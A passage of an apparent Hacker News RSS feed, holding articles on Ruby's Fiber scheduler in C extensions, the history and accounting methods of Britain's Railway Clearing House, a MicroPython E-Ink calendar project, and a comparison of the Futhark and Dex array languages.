<span id="cb1-9"><a href="#cb1-9"></a>      <span># Instead of blocking while the response will be ready, the Fiber</span></span>
<span id="cb1-10"><a href="#cb1-10"></a>      <span># will invoke scheduler to add itself to the list of waiting fibers</span></span>
<span id="cb1-11"><a href="#cb1-11"></a>      <span># and transfer control to other fibers</span></span>
<span id="cb1-12"><a href="#cb1-12"></a>      <span>Net</span>::<span>HTTP</span>.get(<span>'rubyreferences.github.io'</span>, <span>"/rubychanges/</span><span>#{</span>version<span>}</span><span>.html"</span>)</span>
<span id="cb1-13"><a href="#cb1-13"></a>      puts <span>'%s: finished in %.3f'</span> % [version, <span>Time</span>.now - t]</span>
<span id="cb1-14"><a href="#cb1-14"></a>    <span>end</span></span>
<span id="cb1-15"><a href="#cb1-15"></a>  <span>end</span></span>
<span id="cb1-16"><a href="#cb1-16"></a><span>end</span>.join <span># At the </span><span>END</span><span> of the thread code, Scheduler will be called to dispatch</span></span>
<span id="cb1-17"><a href="#cb1-17"></a>         <span># all waiting fibers in a non-blocking manner</span></span>
<span id="cb1-18"><a href="#cb1-18"></a></span>
<span id="cb1-19"><a href="#cb1-19"></a>puts <span>'Total: finished in %.3f'</span> % (<span>Time</span>.now - start)</span>
<span id="cb1-20"><a href="#cb1-20"></a><span># Prints:</span></span>
<span id="cb1-21"><a href="#cb1-21"></a><span>#  2.6: finished in 0.139</span></span>
<span id="cb1-22"><a href="#cb1-22"></a><span>#  2.7: finished in 0.141</span></span>
<span id="cb1-23"><a href="#cb1-23"></a><span>#  3.0: finished in 0.143</span></span>
<span id="cb1-24"><a href="#cb1-24"></a><span>#  Total: finished in 0.146</span></span></code></pre></div>
<p>This example sets the scheduler for the new thread to a new instance of some <code>Scheduler</code> class and then uses <code>Fiber.schedule</code> to send off three HTTP requests that fetch the release notes for several recent Ruby versions. We can see in the output that the total time taken is only a few milliseconds longer than the slowest response, indicating that all three HTTP requests were performed in parallel.</p>
<p>How does this work, given that we can see none of the methods mentioned above being used in the example? Well, <code>Net::HTTP.get</code> uses <code>IO#write</code> and <code>IO#read</code> in its implementation, so while a request is in flight and waiting for a response, its fiber will <code>yield</code> back to the scheduler to let other fibers do work. Since the actual CPU work here is very low, many fibers can be run on the same scheduler without them getting in each other’s way too much.</p>
<h2 id="integrating-the-fiber-scheduler-into-c-extensions">Integrating the Fiber scheduler into C extensions</h2>
<p>Having functions like <code>IO#read</code> and <code>Kernel.sleep</code> automatically using the Fiber scheduler is all well and good, but many useful Ruby gems use C extensions to drop the GVL, perform operations “underneath” the Ruby garbage collector or just for plain speed of execution of computationally expensive operations. These C extensions will typically not use the Ruby methods for writing to and reading from file descriptors, so if they wish to use an existing fiber scheduler to efficiently use non-blocking I/O they have to call it themselves. Luckily, this is not hard!</p>
<p>A (very) quick recap of C extensions for MRI: a Ruby object is represented in C by a <code>VALUE</code> struct that contains all the relevant information about the object. A few “standard” values like <code>true</code>, <code>false</code> and <code>nil</code> and some others have been predefined and are available to test against as <code>Qnil</code>, <code>Qtrue</code>, etc. Ruby methods can be called either directly in C (if the Ruby method itself was defined in C) or with the <code>rb_funcall()</code> C function.</p>
<p>Using the scheduler is obviously only possible if it has been defined for the current thread with <code>Fiber#set_scheduler</code>. To check if this is the case in a C extension, we can use the <code>rb_scheduler_current()</code> C function, which will return a <code>VALUE</code> containing either the current scheduler or <code>Qnil</code> if it hasn’t been set. If the scheduler is set, it is possible to call with one of the available functions that are defined in <code>scheduler.c</code> in the main folder of the Ruby repo. Finally as a complete example, let’s look at how the <a href="https://github.com/ruby/ruby/blob/7d0144e055fdbd7110cf84275b9e145550b77fd3/io.c#L1306">Ruby standard library</a> implements this pattern:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>int</span> rb_io_wait_readable(<span>int</span> f)</span>
<span id="cb2-2"><a href="#cb2-2"></a>{</span>
<span id="cb2-3"><a href="#cb2-3"></a>    VALUE scheduler = rb_scheduler_current();</span>
<span id="cb2-4"><a href="#cb2-4"></a>    <span>if</span> (scheduler != Qnil) {</span>
<span id="cb2-5"><a href="#cb2-5"></a>        <span>return</span> RTEST(</span>
<span id="cb2-6"><a href="#cb2-6"></a>            rb_scheduler_io_wait_readable(scheduler, rb_io_from_fd(f))</span>
<span id="cb2-7"><a href="#cb2-7"></a>        );</span>
<span id="cb2-8"><a href="#cb2-8"></a>    }</span>
<span id="cb2-9"><a href="#cb2-9"></a></span>
<span id="cb2-10"><a href="#cb2-10"></a>    <span>// rest of function for if no scheduler was defined</span></span>
<span id="cb2-11"><a href="#cb2-11"></a>}</span></code></pre></div>
<p>This snippet also demonstrates how to get a Ruby <code>IO</code> object out of a file descriptor: with <code>rb_io_from_fd()</code>.</p>
<h2 id="drawbacks-of-fibers">Drawbacks of Fibers</h2>
<p>The current implementation does still have some drawbacks. For one, fibers are thread-local and cannot be moved between threads (yet). (For the purposes of this paragraph, you can also read “Ractor” wherever I wrote “thread”.) This means that any system that wants to scale beyond a single thread will have to run multiple threads, each with their own …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html">http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html</a></em></p>]]>
            </description>
            <link>http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560894</guid>
            <pubDate>Mon, 28 Dec 2020 17:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Railway Clearing House (1936)]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25560849">thread link</a>) | @jpkoning
<br/>
December 28, 2020 | https://www.railwaywondersoftheworld.com/clearing-house.html | <a href="https://web.archive.org/web/*/https://www.railwaywondersoftheworld.com/clearing-house.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="txt_560">
        <p>Checking Rail Transport Revenue</p>
        
        <p><a href="https://www.railwaywondersoftheworld.com/britain.html">RAILWAYS OF BRITAIN -<wbr> 22</a></p>
        
        <p><img alt="Sorting railway tickets in the Railway Clearing House" title="Sorting railway tickets in the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpf5eb4ce3_05_06.jpg" id="pic_1234"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>SORTING TICKETS in the Railway Clearing House is carried out by a large staff of highly skilled employees. The function of the Railway Clearing House is to clear or to apportion the receipts of the through traffic of Great Britain’s railways and of certain Irish lines and ports. Some 23,000 miles of rail routes come under the scope of the Railway Clearing House system.</p>
        
        
        
        <p>A PROSPECTIVE passenger can walk into any station booking-<wbr>office in Great Britain and purchase a ticket for practically any other station in the country -<wbr> and that ticket will take him right through to his destination, irrespective of the ownership of the lines over which he may have to travel.</p>
        
        <p>The traveller may buy a ticket at Dover, on the Southern Railway, for -<wbr> say, Oban, served by the LMS. How is the ticket money shared?</p>
        
        <p>Again, a train of goods wagons on any line will often bear the initials of all the railway companies -<wbr> GWR, LMS, LNER, SR. How is carriage paid for on the goods in these wagons -<wbr> running as they do over the lines of other companies?</p>
        
        <p>In both instances settlement is made through the <a href="https://en.wikipedia.org/wiki/Railway_Clearing_House">Railway Clearing House</a>. The story of the RCH, as it is usually known, goes back to the very early days of railway operation. At first there was no provision for through booking by passengers. It was not possible to send goods throughout the journey in the same wagon.</p>
        
        <p>The travelling public soon began to demand the convenience of through booking. Merchants, too, dissatisfied with the loss and delay occasioned by transhipping goods from one company’s wagons to those of another, agitated for a system of through-<wbr>invoicing for goods traffic. The railways were forced to give facilities to meet the general demand, but for a time the difficulties of settlement between the various companies were a bar to progress.</p>
        
        <p>It is uncertain whether the credit for the idea of a central office to deal with the settlement of through accounts is due to <a href="http://en.wikipedia.org/wiki/George_Glyn,_1st_Baron_Wolverton">Mr. George Carr Glyn</a> (afterwards Lord Wolverton), chairman; to <a href="http://en.wikipedia.org/wiki/Robert_Stephenson">Mr. Robert Stephenson</a> (son of George Stephenson), engineer; to Mr. Kenneth Morison, chief of audit department, all of the <a href="https://en.wikipedia.org/wiki/London_and_Birmingham_Railway">London and Birmingham Railway</a>, or to <a href="http://en.wikipedia.org/wiki/James_Joseph_Allport">Sir James Allport</a> of the Midland Railway. Mr. Glyn, however, the banker, who was, of course, familiar with the methods of the historic Bankers’ Clearing House for the settlement of financial transactions, without doubt wholeheartedly supported the idea.</p>
        
        <p>The Railway Clearing House was accordingly established on January 2, 1842. From that date travelling facilities began to expand.</p>
        
        <p>A staff of four men formed the nucleus of the Clearing House, which was situated in Drummond Street, opposite the present main entrance to Euston Station, a London terminus of the LMS. Business was carried on at Drummond Street until 1848, when the first block of the present building in Seymour Street, Euston Square, was built.</p>
        
        <p>The first secretary of the Clearing House was Mr. Kenneth Morison. Nine railway companies were admitted to participate in the business. They were the London and Birmingham, Midland Counties, Birmingham and Derby Junction, North Midland, Hull and Selby, Manchester and Leeds, Leeds and Selby, York and North Midland, and Great North of England. These companies have long since been merged in the constituent companies of the LMS or LNER.</p>
        
        <p><img alt="Old documents in the muniment room of the Railway Clearing House" title="Old documents in the muniment room of the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpa5fb7576_05_06.jpg" id="pic_1235"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>OLD DOCUMENTS are stored in the muniment room of the Railway Clearing House, seen in the above picture. The Railway Clearing House is divided into three main departments -<wbr> the Secretarial, the Merchandise, and the Coaching sections.</p>
        
        
        
        <p>The traffic receipts handled by the original Clearing House were those for the through conveyance of goods, passengers, parcels and live stock between London and Darlington in one direction and between Manchester and Hull in the other.</p>
        
        <p>The railways included in the RCH system had increased by 1845 to sixteen, with 656 route-<wbr>miles of track. The difficulties of obtaining cash settlement between the railway companies and the clearing house, led in 1850 to the passing of an <a href="http://www.railwaysarchive.co.uk/documents/HMG_Act_Clear1850.pdf">Act of Parliament</a> conferring on the RCH the right to sue in the courts. This ended the trouble and the companies subsequently settled all payments promptly.</p>
        
        <p>The Railway Clearing House was Incorporated by Act of Parliament in 1897. From its beginning it had been under the control of a Committee consisting of one delegate from each of the companies under the system. Changes were made, however, under the Railway Clearing House Amalgamation Scheme of 1922.</p>
        
        <p>The corporation now consists of four delegates from each of the four great amalgamated companies and one from each of the other companies, namely the London Passenger Transport Board, Mersey Railway, the lines of the Joint Committees, and the Irish Companies. An executive or “Superintending Committee” of eight members is elected from the delegates of the corporation.</p>
        
        <p>The number of companies working under the RCH system to-<wbr>day is fifteen, with a total route length of 23,000 miles -<wbr> a figure in striking contrast to the 656 miles of 1845. The receipts of the Clearing House for 1842 were £193,246; for 1933 the amount involved was over £34,000,000, an equally striking comparison.</p>
        
        <p>The work of the Railway Clearing House is divided into three Departments -<wbr> Merchandise, Coaching, and Secretarial.</p>
        
        <p>The Merchandise Department apportions the receipts from the carriage of goods, minerals, and livestock. Coal traffic was formerly settled through the Clearing House, but adjustments are now made by the originating Company, which collects the charges and pays out the other companies' proportions.</p>
        
        <p>The first function of the Railway Clearing System is to ensure that charges in which two or more companies are concerned are correctly accounted for at both terminal stations, from which the respective agents send information each month to the Clearing House. Any differences between the two sets of accounts are then settled by correspondence through the Audit offices.</p>
        
        <p>Perhaps the best means of understanding the system will be to consider, for example, a consignment of goods from Bristol (LMS) to Southampton (Southern) via The Somerset and Dorset Joint (between Bath and Templecombe).</p>
        
        <p>We will assume that the load weighs 10 tons and the charge is £10, of which half is “paid” at Bristol and the other half “to be paid” at Southampton. On making a settlement there are three companies to share in the receipt of £10 -<wbr> the LMS (Bristol to Bath), the Somerset and Dorset Joint (Bath to Templecombe), and the Southern Railway (Templecombe to Southampton).</p>
        
        <p>The first adjustment to be made on the accounts is that relative to what are known as “terminal services”, such as collection and delivery charges. The balance of the total charges is usually divided on a mileage basis, according to the distance the load is carried over each of the railways. There are, however, a number of exceptions to this principle, such as agreed apportionments, fixed tolls on tonnage, and other special methods of division.</p>
        
        <p>The above example might be clearly expressed by the following tabulation:</p>
        
        
        
        
        
        
        
        
        
        
        <p>This leaves a residue from £10 of £7 13s 4d, which is divided on a mileage basis, taking the total distance at 100 miles -<wbr> 10 miles on the LMS, 30 miles on the Somerset and Dorset Joint, and 60 miles on the Southern Railway.</p>
        
        <p>The apportionment of the £7 13s 4d would then be as follows:</p>
        
        
        
        
        
        
        
        
        
        
        
        <p>The final balance payable to each company would thus be:</p>
        
        
        
        
        
        
        
        
        
        
        
        
        <p>If there had been traffic in the reverse direction, the two entries would have been combined in one settlement to cover both “up” and “down” traffic.</p>
        
        <p>To minimize the clerical work involved, it is now the practice to limit individual division to the larger monthly sums, and to make a bulk settlement of the smaller monthly amounts. In practice, the larger amounts are not divided in detail until the close of the half years ended June and December. Each month “interim” accounts are brought out and payments made “on account” to the companies concerned, subject to adjustment at the half-<wbr>yearly settlement.</p>
        
        <p>Excursion Traffic</p>
        
        <p>The bulk settlement of small amounts is made on a basis of total receipts per pair of companies, irrespective of route. After a percentage deduction for terminal charges, the remainder is divided half-<wbr>yearly, on an agreed formula. This is done to avoid many separate calculations. Since in each half year there are as many as three million transactions, three-<wbr>fourths of are which “small”, the saving of work will be obvious.</p>
        
        <p>Passenger traffic is dealt with through the Railway Clearing House on different lines, and is divided by its Coaching …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.railwaywondersoftheworld.com/clearing-house.html">https://www.railwaywondersoftheworld.com/clearing-house.html</a></em></p>]]>
            </description>
            <link>https://www.railwaywondersoftheworld.com/clearing-house.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560849</guid>
            <pubDate>Mon, 28 Dec 2020 17:05:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Building an E-Ink Calendar and a UI Toolkit along the way]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25560570">thread link</a>) | @rahulrav
<br/>
December 28, 2020 | https://rahulrav.com/blog/e_ink_dashboard.html | <a href="https://web.archive.org/web/*/https://rahulrav.com/blog/e_ink_dashboard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <main>
            <div>
              <div>
                <p>December 27 2020, Monday</p>
<h3 id="building-an-e-ink-calendar-and-a-ui-toolkit-along-the-way">Building an E-Ink Calendar, and a UI Toolkit along the way</h3>
<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>
              </div>
            </div>
            
          </main>
          
          
          
        </div></div>]]>
            </description>
            <link>https://rahulrav.com/blog/e_ink_dashboard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560570</guid>
            <pubDate>Mon, 28 Dec 2020 16:38:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Comparison of Futhark and Dex]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25559967">thread link</a>) | @Athas
<br/>
December 28, 2020 | https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on December 28, 2020
    
        by Troels Henriksen
    
</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)
   xsCov</code></pre>
<p>In Futhark we write it as:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>let</span> covariance0 [n] (xs:[n]f64) (xsm:f64) (ys:[n]f64) (ysm:f64) =</span>
<span id="cb7-2">  f64.sum (map2 (\x y -&gt; (x-xsm) * (y-ysm)) xs ys) / f64.i64 (n<span>-1</span>)</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>let</span> covariance [n][d] (xs:[n][d]f64) =</span>
<span id="cb7-5">  <span>let</span> xsT = transpose xs</span>
<span id="cb7-6">  <span>let</span> means = map mean xsT</span>
<span id="cb7-7">  <span>in</span> map2 (\a a_mean -&gt;</span>
<span id="cb7-8">             map2 (\b b_mean -&gt; covariance0 a a_mean b b_mean)</span>
<span id="cb7-9">                  xsT means)</span>
<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
